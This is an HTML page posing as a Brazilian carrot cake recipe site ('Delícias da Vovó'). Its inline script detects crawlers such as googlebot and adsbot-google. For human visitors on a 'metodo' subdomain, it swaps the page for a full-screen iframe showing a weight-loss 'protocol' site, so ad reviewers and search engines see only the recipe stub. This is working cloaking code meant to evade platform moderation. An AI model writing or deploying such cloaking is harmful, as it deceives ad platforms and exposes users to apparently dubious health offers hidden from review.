<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Delícias da Vovó</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        .viewport-container {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: relative;
        }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            /* Ajuste matemático para compensar o zoom de 75% (100 / 0.75 = 133.33) */
            width: 133.33% !important; 
            height: 133.33% !important;
            border: none;
            transform: scale(0.75); 
            transform-origin: 0 0;
        }

        .safe-area { padding: 20px; color: #fff; font-family: sans-serif; }
    </style>
</head>
<body>

<script>
    const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
    const isMetodo = window.location.hostname.includes('metodo');

    // Só executa o Iframe com zoom se for humano no subdomínio metodo
    if (isMetodo && !isBot) {
        document.body.innerHTML = '<div class="viewport-container"><iframe src="https://protocoloemagrecimentodivino.lovable.app/"></iframe></div>';
    }
</script>

<div class="safe-area">
    <h1>O Melhor Bolo de Cenoura Perfeito</h1>
    <p>Receita tradicional...</p>
</div>

</body>
</html>
